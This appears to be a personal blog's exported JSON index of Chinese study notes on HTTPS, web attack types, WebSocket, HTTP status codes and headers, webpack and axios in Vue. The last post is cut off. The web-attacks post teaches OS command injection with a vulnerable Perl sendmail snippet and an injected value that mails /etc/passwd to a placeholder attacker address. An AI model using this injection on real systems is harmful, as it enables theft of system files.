{"meta":{"title":"小柒","subtitle":"www.xiaoqi.cn","description":"欢迎来到我的世界!","author":"小柒","url":"https://coloey.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-11-12T10:10:34.000Z","updated":"2021-11-12T10:12:26.795Z","comments":true,"path":"categories/index.html","permalink":"https://coloey.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HTTPS","slug":"HTTPS","date":"2022-04-12T14:02:46.000Z","updated":"2022-04-12T14:33:10.441Z","comments":true,"path":"2022/04/12/HTTPS/","link":"","permalink":"https://coloey.github.io/2022/04/12/HTTPS/","excerpt":"","text":"HTTP+加密+认证+完整性保护=HTTPSHTTPS是HTTP通信接口部分用SSL和TLS协议代替。 SSL是独立于HTTP的协议 相互交换密钥的公开密钥加密技术共享密钥加密加密和解密用一个密钥的方式，也叫做对称密钥加密 使用两把密钥的公开密钥加密使用非对称的密钥，一把叫做私有密钥，另一把叫做公有密钥，私有密钥不能让任何人知道，公有密钥可以随意发布。 发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密，解密过程是队离散对数的求值。 HTTPS采用混合加密机制 证明公开密钥正确性的证书 HTTPS的安全通信机制 客户端通过发送Client Hello报文开始SSL通信，报文中包含客户端支持的SSL的指定版本，加密组件列表 服务器可进行SSL通信时，会以Server Hello报文作为应答，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的 之后服务器发送Certificate报文，报文中包含公开密钥证书 最后服务器发送Server Hello Done 报告通知客户端，最初阶段的SSL握手协商部分结束 SSL第一次握手结束后，客户端以Client Key Exchange报文作为回应，报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串，该报文已用步骤3中的公开密钥进行加密 接着客户端继续发送Change Cipher Spec报文，该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密 客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否正确解密该报文作为判定标准 服务器同样发送Change Cipher Spec报文 服务器同样发送Finished报文 服务端和客户端的Finished报文交换完毕后，SSL连接就建立完成。通信会受到SSL保护，从此开始进行应用层协议通信，即发送HTTP请求 SSL缺点： 通信慢 大量消耗CPU及内存资源，导致处理速度慢","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"针对Web的攻击技术","slug":"针对Web的攻击技术","date":"2022-04-12T10:09:24.000Z","updated":"2022-04-12T14:00:45.873Z","comments":true,"path":"2022/04/12/针对Web的攻击技术/","link":"","permalink":"https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","excerpt":"","text":"针对Web应用的攻击模式 主动攻击 被动攻击 以服务器为目标的主动攻击指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击 以服务器为目标的被动攻击被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击 跨站脚本攻击（XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击 跨站脚本攻击可能造成的影响 利用虚假输入的表单骗取用户个人信息 利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求 显示伪造的文章或图片 eg: 在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入： 对用户Cookie的窃取 SQL注入攻击会执行非法SQL的SQL注入攻击 造成影响： 非法查看或篡改数据库内的数据 规避认证 执行和数据库服务业务关联的程序等 eg: 某购物网站可将坐着名字作为搜索关键字查找他的所有著作 结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示 OS命令注入攻击指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。 可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。 eg: 咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。 123my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);print MAIL &quot;FROM :info@example.com\\n&quot;; 程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址 1;cat /etc/passwd |mail hack@example.jp 程序接收到该值后构成以下组合： 1open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp “;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给&#104;&#97;&#99;&#107;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#x6a;&#112;。 HTTP首部注入攻击值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。 HTTP首部注入攻击有可能会造成以下影响： 设置任何Cookie信息 重定向至任意URL 显示任意的主体（HTTP响应阶段攻击） 此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户 攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。 HTTP响应截断攻击HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。 利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果 邮件首部注入攻击攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。邮件地址：%0D%0A 代表一个换行符，可以实现邮件地址的追加 %0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容 目录遍历攻击：对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击用户可使用．…/等相对路径定位到/etc/passed等绝对路径上例： 远程文件包含漏洞当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。例： 开放重定向是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板 因会话管理疏忽引发漏洞会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。 会话 会话固定攻击对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID 例子： 跨站点请求伪造（CSRF）是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。 可能造成的影响： 利用已通过认证的用户权限更新设定信息等 利用已通过认证的用户权限购买商品 利用已通过认证的用户权限在留言板发表言论 例子： DOS攻击是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。 主要有两种DOS攻击方式： 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。 通过攻击安全漏洞使服务停止 集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。 多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"WebSocket","slug":"WebSocket","date":"2022-04-12T09:46:11.000Z","updated":"2022-04-12T10:03:19.606Z","comments":true,"path":"2022/04/12/WebSocket/","link":"","permalink":"https://coloey.github.io/2022/04/12/WebSocket/","excerpt":"","text":"初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？ 答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。 举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。 这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用“轮询”：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。 轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。 使用浏览器进行全双工通信的WebSocketWebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。 它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。 其他特点包括： （1）建立在 TCP 协议之上，服务器端的实现比较容易。 （2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。 （3）减少通信量，只要建立起WebSocket连接，就希望一直保持连接，和http相比，不但每次连接时走开小减少。而且数据格式比较轻量，性能开销小，通信高效。 （4）可以发送文本，也可以发送二进制数据。 （5）没有同源限制，客户端可以与任意服务器通信。 （6）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。 1ws://example.com:80/some/path 握手请求1Upgrade:websocket Set-WebSocket-Key字段内记录着握手过程中必不可少的键值，Sec-WebSocket-Protocol字段内记录使用的子协议，子协议按WebSocket协议标准在连接分开使用时，定义那些连接的名称 握手响应对于之前的请求，返回状态码101 Switching Protocols的响应","categories":[{"name":"WebSocket","slug":"WebSocket","permalink":"https://coloey.github.io/categories/WebSocket/"}],"tags":[]},{"title":"返回结果的http状态码","slug":"返回结果的http状态码","date":"2022-04-11T11:58:12.000Z","updated":"2022-04-11T13:30:34.582Z","comments":true,"path":"2022/04/11/返回结果的http状态码/","link":"","permalink":"https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/","excerpt":"","text":"状态码作用：状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求，还是出现了错误。 状态码类别： 类别 原因短语 1xx Informational(信息状态码) 接收的请求正在处理 2xx Success(成功状态码) 请求正常处理完毕 3xx Redirection(重定向状态码) 需要进行附加操作以完成请求 4xx Client Error(客户端错误状态码) 服务器无法处理请求 5xx Server Error(服务器错误状态码) 服务器处理请求出错 2xx成功200 OK表示从客户端发来的请求在服务器端被正常处理了 在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用Get方法，对应请求支援的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文实体作为响应返回。（即在响应中只返回首部，不返回实体主体部分） 204 No Content该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，不允许返回任何实体的主体。比如，当从浏览器中发出请求处理后，返回204响应，那么浏览器显示的页面不发生更新。 一般在只需要从客户端往服务器发送消息，而对客户端不需要发送新消息内容的情况下使用 206 Partial Content该状态码表示客户端进行范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容 3xx重定向3xx响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。 301 Moved Permanently永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指的URI，也就是说，如果已经把资源对应的URI保存为书签，这时应该按Location首部字段提示的URI重新保存。 eg: http://example.com/sample 当指定资源路径的最后忘记添加“/“，就会产生301状态码 302 Found临时性重定向，该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。和301 Moved Permanently状态码相似，但302状态码代表的资源不是被永久移动，只是临时性质。换句话说，已移动的资源对应的URI将来还有可能发生改变。用户把URI保存成书签，但不会像301状态码出现时那样去更新书签，而是仍旧保留返回的302状态码的页面对应的URI。 303 See Other该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。303状态码和302Found状态码有着相同功能。但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。比如，当使用POST方法访问CGI程序，其执行后的处理结果是希望客户端能以GET方法重定向到另一个URI上去时，返回303状态码。 当301,302,303返回响应码时，几乎所有浏览器都会把POST改为GET，并删除请求报文的主体，之后请求会自动再次发送。 301,302标准是禁止将POST改为GET，但实际上大家都这么做。 304 Not Modified该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况，304状态码返回时，不包括任何响应的主体部分。304和重定向没有关系。 307 Temporary Redirect临时重定向。该状态码与302 Found有着相同的含义。尽管302标准禁止POST变为GET，但实际使用时大家并不遵守。307会按照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同情况。 4xx客户端错误4xx的响应结果表明客户端时发生错误的原因所在 400 Bad Request该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 Ok一样对待状态码 401 Unauthorized该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。 返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate首部用于质询用户信息，当浏览器初次接收到401响应，会弹出认证用的对话窗口。 403 Forbidden该状态码表明对请求资源的访问被服务器拒绝了。服务端没有给出拒绝的详细理由，但如果做说明，可以在实体的主体部分对原因进行描述。 未获得文件系统的访问授权，访问权限出现某些问题（从未授权的源IP地址试图访问）等列举的情况都可能是发生403的原因。 404 Not Found该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务端拒绝请求且不想说理由时使用。 5xx服务器错误5xx的响应结果表明服务器本身发生错误 500 Internal Server Error表明服务器端在执行请求时发生了错误，也有可能时Web应用存在的bug或某些临时的故障 503 Service Unavailable表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After首部字段再返回给客户端。 状态码和状况不一致： 不少返回的状态码响应都是错误的，但是用户可能察觉不到这点，比如Web应用程序内部发生错误，状态码依然返回200 OK。","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"http请求首部字段","slug":"http请求首部字段","date":"2022-04-11T11:53:59.000Z","updated":"2022-04-12T14:34:10.450Z","comments":true,"path":"2022/04/11/http请求首部字段/","link":"","permalink":"https://coloey.github.io/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/","excerpt":"","text":"Accept Accept:text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept首部字段通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可用type/subtype这种形式，一次指定多种媒体类型。 文本文件：text/html,text/plain,text/css… application/xhtml+xml,application/xml… 图片文件：image/jpg,image/gif… 视频文件：video/mpeg,video/quicktime… 应用程序使用的二进制文件：application/octet-stream,application/zip… 若想给显示的媒体类型增加优先级，使用q=来额外表示权重值，用分号（；）进行分隔，权重值q范围是0~1,（可精确到小数点后3位，且1为最大值。不指定权重值q时，默认权重为q=1.0 当服务器提供多种内容时，将首先返回权重值最高的媒体类型。 Accept-Charset Accept-Charset:iso-8859-5,unicode-1-1;q=0.8 Accept-Charset首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与各首部字段Accept相同的是可用权重q值来表示相对优先级 该首部字段用于内容协商机制的服务器驱动协商。 Accept-Encoding Accept-Encoding:gzip,deflate Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。 gzip:由文件压缩程序gzip（GNU zip)生成的编码格式，采用LZ77及32为循环冗余校验 compress:由UNIX文件压缩程序compress生成的编码格式，采用的算法LZW deflate:组合使用zlib格式及由deflate压缩算法生成的编码格式 identity:不执行压缩或不会变化的默认编码格式 采用权值q来表示相对优先级，这点与首部字段Accept相同。可用(*)作为通配符，指定任意编码格式 Accept-Language告知服务器用户代理能够处理的自然语言集，以及自然语言集的相对优先级。可一次指定多种自然语言集 按权重q表示相对优先级。 Authorization首部字段Authorization用来告知服务器，用户代理的认证信息，通常想要通过服务器认证的用户代理会在接收待返回的401状态码后，把首部字段Authorization加入到请求中。共用缓存在接收到含有Authorization首部字段的请求时的操作处理会略有差异。 Expect Expect:100-continue 客户端使用首部字段Expect来告知服务器，期望出现的某种特定行为，因服务器无法理解客户端的期望做出回应而发生错误时，会返回417Expectation Failed 客户端可以利用该首部字段，写明所期望的扩展。虽然HTTP/1.1规范只定义100-continue(状态码100Continue之意) From首部字段From用来告知服务器使用用户代理的用户的电子邮件地址。通常使用目的是为了显示搜索引擎用户代理的负责人的电子邮件联系方式。使用代理时，尽可能包含From首部字段 Host首部字段Host会告知服务器，请求的资源所处的互联网主机名和端口号。Host首部字段再HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。 请求被发送到服务器时，请求中的主机名会用IP地址直接替换解决，但如果这时相同的IP地址下部署运行着多个域名，那么服务器就无法理解是哪个域名对应的请求。因此，就要使用首部字段Host来明确指出请求的主机名，若服务器未设定主机名，那直接发送空值。 Host: If-Matchif-xxx为条件请求，服务器接收到附带条件请求后，只有判断指定条件为真，才执行请求。 首部字段If-Match，属于附带条件之一，它会告知服务器匹配资源所用的实体标记(ETag)值，这时的服务器无法使用弱ETag值，服务器对比If-Match的字段值与资源的ETag值，仅当两者一致时才执行请求，否则，返回状态码412 Precondition Failed 还可以使用(*)指定If-Match的字段值，针对这种情况，服务器会忽略ETag的值，只要资源存在就处理请求。 If-Modified-Since If-Modified-Since: Thu,15 Apr 2004 00:00:00 GMT 首部字段If-Modified-Since属于附带条件之一，它会告知服务器若If-Modified-Since字段值早于资源的更新时间，则希望能处理该请求，而在If-Modified-Since字段值的日期时间后，如果请求的资源都没有更新，返回状态码304Not Modified的响应 If-Modified-Since用于确认代理或客户端拥有的本地资源的有效性，获取资源的更新时间可通过确认首部字段Last-Modified确定 If-None-Match与If-Match作用相反，用于指定If-None-Match字段值的实体标记（ETag)值与请求资源得到ETag不一致时会告知服务器处理该请求。 在GET或HEAD方法中使用首部字段If-None-Match可获取最新的源，因此这与使用首部字段If-Modified-Since有些类似。 If-RangeIf-Range字段值若是和ETag值或更新的日期时间匹配一致，那么就作为范围请求处理，若不一致返回全部资源 如果不使用If-Range,而是使用If-Match,服务器端的资源如果更新了，那客户端持有的资源中的一部分也会随之无效，服务器端就会以402 Precondition Failed返回，催促客户端再次发请求，与使用If-Range相比，就要花费两倍的功夫。 If-Unmodified-Since与If-Modified-Since作用相反，它的作用是告知服务器，指定的资源只有在字段值内指定的日期时间之后未发生更新得情况下，才能处理请求，如果在指定日期时间后发生了更新，则以状态码412 Precondition Failed作为响应返回 Max-Forwards通过TRACE方法或OPTIONS方法，发送包含首部字段Max-Forwards的请求时，该字段以十进制整数的形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求前，Max-Forwards的值减1后重新复制，当服务器收到Max-Forwards值为0的请求时则不再进行转发，而是直接返回响应。 如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"开发环境","slug":"开发环境","date":"2022-04-11T06:51:43.000Z","updated":"2022-04-11T11:53:09.615Z","comments":true,"path":"2022/04/11/开发环境/","link":"","permalink":"https://coloey.github.io/2022/04/11/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/","excerpt":"","text":"开发环境中使用source map当 webpack 打包源代码时，可能会很难追踪到 error(错误) 和 warning(警告) 在源代码中的原始位置。例如，如果将三个源文件（a.js, b.js 和 c.js）打包到一个 bundle（bundle.js）中，而其中一个源文件包含一个错误，那么堆栈跟踪就会直接指向到 bundle.js。你可能需要准确地知道错误来自于哪个源文件，所以这种提示这通常不会提供太多帮助。 为了更容易地追踪 error 和 warning，JavaScript 提供了 source maps 功能，可以将编译后的代码映射回原始源代码。如果一个错误来自于 b.js，source map 就会明确的告诉你。 source map 有许多 可用选项，请务必仔细阅读它们，以便可以根据需要进行配置。 对于本指南，我们将使用 inline-source-map 选项，这有助于解释说明示例意图（此配置仅用于示例，不要用于生产环境）： 1234567891011121314151617181920212223242526272829303132333435363738394041const path=require(&#x27;path&#x27;)const HtmlWebpackPlugin=require(&quot;html-webpack-plugin&quot;)module.exports=&#123; entry:&#123; index: &#x27;./src/index.js&#x27;, print:&#x27;./src/print.js&#x27; &#125;, output:&#123; filename:&#x27;[name]bundle.js&#x27;, path:path.resolve(__dirname,&#x27;dist&#x27;), clean:true, publicPath:&#x27;/&#x27;, &#125;, module:&#123; rules:[ &#123; test: /\\.css$/i, use:[&#x27;style-loader&#x27;,&#x27;css-loader&#x27;], &#125;, &#123; test:/\\.(png|jpg|jpeg|svg|gif)$/i, type:&#x27;asset/resource&#x27; &#125;, ] &#125;, devtool:&#x27;inline-source-map&#x27;, devServer:&#123; static:&#x27;./dist&#x27;, &#125;, plugins:[ new HtmlWebpackPlugin(&#123; title:&#x27;Development&#x27;, &#125;) ], mode:&#x27;development&#x27;&#125; 选择开发工具webpack 提供几种可选方式，帮助你在代码发生变化后自动编译代码： webpack’s Watch Mode webpack-dev-server webpack-dev-middleware 多数场景中，你可能需要使用 webpack-dev-server，但是不妨探讨一下以上的所有选项。 使用watch mode你可以指示 webpack “watch” 依赖图中所有文件的更改。如果其中一个文件被更新，代码将被重新编译，所以你不必再去手动运行整个构建。 我们添加一个用于启动 webpack watch mode 的 npm scripts： package.json 12345678910111213141516171819202122&#123; &quot;name&quot;: &quot;webpack-demo&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;private&quot;: true, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;,+ &quot;watch&quot;: &quot;webpack --watch&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;html-webpack-plugin&quot;: &quot;^4.5.0&quot;, &quot;webpack&quot;: &quot;^5.4.0&quot;, &quot;webpack-cli&quot;: &quot;^4.2.0&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;lodash&quot;: &quot;^4.17.20&quot; &#125; &#125; 现在，你可以在命令行中运行 npm run watch，然后就会看到 webpack 是如何编译代码。 唯一的缺点是，为了看到修改后的实际效果，你需要刷新浏览器。如果能够自动刷新浏览器就更好了，因此接下来我们会尝试通过 webpack-dev-server 实现此功能。 webpack-dev-serverwebpack-dev-server 为你提供了一个基本的 web server，并且具有 live reloading(实时重新加载) 功能。设置如下： 1npm install --save-dev webpack-dev-server 修改配置文件，告知 dev server，从什么位置查找文件： webpack.config.js 123456789101112131415161718192021222324 const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; mode: &#x27;development&#x27;, entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, devtool: &#x27;inline-source-map&#x27;,+ devServer: &#123;+ static: &#x27;./dist&#x27;,+ &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Development&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;), clean: true, &#125;, &#125;; 以上配置告知 webpack-dev-server，将 dist 目录下的文件 serve 到 localhost:8080 下。（译注：serve，将资源作为 server 的可访问文件） 我们添加一个可以直接运行 dev server 的 script： package.json 123456&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;watch&quot;: &quot;webpack --watch&quot;,+ &quot;start&quot;: &quot;webpack serve --open&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, 现在，在命令行中运行 npm start，我们会看到浏览器自动加载页面。如果你更改任何源文件并保存它们，web server 将在编译代码后自动重新加载 webpack-dev-middlewarewebpack-dev-middleware 是一个封装器(wrapper)，它可以把 webpack 处理过的文件发送到一个 server。webpack-dev-server 在内部使用了它，然而它也可以作为一个单独的 package 来使用，以便根据需求进行更多自定义设置。下面是一个 webpack-dev-middleware 配合 express server 的示例。 首先，安装 express 和 webpack-dev-middleware： 1npm install --save-dev express webpack-dev-middleware 调整webpack.config,js 12345678910111213141516171819202122232425 const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; mode: &#x27;development&#x27;, entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, devtool: &#x27;inline-source-map&#x27;, devServer: &#123; static: &#x27;./dist&#x27;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Development&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;), clean: true,+ publicPath: &#x27;/&#x27;, &#125;, &#125;; 我们将会在 server 脚本使用 publicPath，以确保文件资源能够正确地 serve 在 http://localhost:3000 下，稍后我们会指定 port number(端口号)。接下来是设置自定义 express server： 12345678910 webpack-demo |- package.json |- package-lock.json |- webpack.config.js+ |- server.js |- /dist |- /src |- index.js |- print.js |- /node_modules server.js 1234567891011121314151617181920const express = require(&#x27;express&#x27;);const webpack = require(&#x27;webpack&#x27;);const webpackDevMiddleware = require(&#x27;webpack-dev-middleware&#x27;);const app = express();const config = require(&#x27;./webpack.config.js&#x27;);const compiler = webpack(config);// 告知 express 使用 webpack-dev-middleware，// 以及将 webpack.config.js 配置文件作为基础配置。app.use( webpackDevMiddleware(compiler, &#123; publicPath: config.output.publicPath, &#125;));// 将文件 serve 到 port 3000。app.listen(3000, function () &#123; console.log(&#x27;Example app listening on port 3000!\\n&#x27;);&#125;); 现在，添加一个 npm script，以使我们更方便地运行 server： package.json 1234567 &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;watch&quot;: &quot;webpack --watch&quot;, &quot;start&quot;: &quot;webpack serve --open&quot;,+ &quot;server&quot;: &quot;node server.js&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, 现在，在 terminal(终端) 中执行 npm run server","categories":[{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"}],"tags":[]},{"title":"Vue中封装axios请求","slug":"Vue中封装axios请求","date":"2022-04-11T02:01:47.000Z","updated":"2022-04-11T02:24:02.431Z","comments":true,"path":"2022/04/11/Vue中封装axios请求/","link":"","permalink":"https://coloey.github.io/2022/04/11/Vue%E4%B8%AD%E5%B0%81%E8%A3%85axios%E8%AF%B7%E6%B1%82/","excerpt":"","text":"在src文件夹中新创建一个utils文件夹，创建index.js来实现axios实例，并配置拦截器 index.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import axios from &#x27;axios&#x27;import &#123;ElLoading,ElMessage&#125; from &#x27;element-plus&#x27;import router from &quot;../router&quot;import store from &quot;../store&quot;import CHAT from &quot;../client&quot;//const pendingMap=new Map();//axios.defaults.headers.post[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;;//创建一个axios实例var instance=axios.create(&#123; baseURL:&quot;http://127.0.0.1:3007&quot;, timeout: 10000,//设置超时 headers:&#123; &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;, &#125;&#125;)let loading;//多次请求时let requestCount=0;//显示Loadingconst showLoading=()=&gt;&#123; if(requestCount===0&amp;&amp;!loading)&#123;//第一次发送请求并且没有loading加载loaing loading=ElLoading.service(&#123; text:&#x27;Loading&#x27;, background:&#x27;rgba(0,0,0,0.7)&#x27;, spinner:&#x27;el-icon-loading&#x27;, &#125;) &#125; requestCount++;//多次请求&#125;//隐藏loadingconst hideLoading=()=&gt;&#123; requestCount--; if(requestCount===0)&#123; loading.close()//直到请求都结束Loading才关闭 &#125;&#125;//请求拦截器instance.interceptors.request.use((config)=&gt;&#123; showLoading() //每次发送请求前判断是否存在token如果存在则在header加上token const token=window.localStorage.getItem(&#x27;token&#x27;); token&amp;&amp;(config.headers.Authorization=token) return config;&#125;,(error)=&gt;&#123; Promise.reject(error);&#125;)//响应拦截器instance.interceptors.response.use((response)=&gt;&#123; hideLoading() //响应成功 // console.log(&#x27;拦截器报错&#x27;) // console.log(response) const status=response.data.status; if(status!=1)&#123; switch(status)&#123; case 0: //响应成功后如果是登录成功有token把token存储在本地 if(response.data.token!=undefined)window.localStorage.setItem(&#x27;token&#x27;,response.data.token); break; case 200://获取用户信息成功后存储在localStorage里和store console.log(response.data); store.commit(&quot;saveUserInfo&quot;,(response.data).data); window.localStorage.setItem(&#x27;userInfo&#x27;,JSON.stringify((response.data).data)); break; case 401://登录过期跳转到登录页面 case 201://退出登录清空token跳转登录页面 window.localStorage.removeItem(&#x27;token&#x27;); window.localStorage.removeItem(&#x27;userInfo&#x27;) CHAT.logout(); router.push(&quot;/login&quot;); &#125; 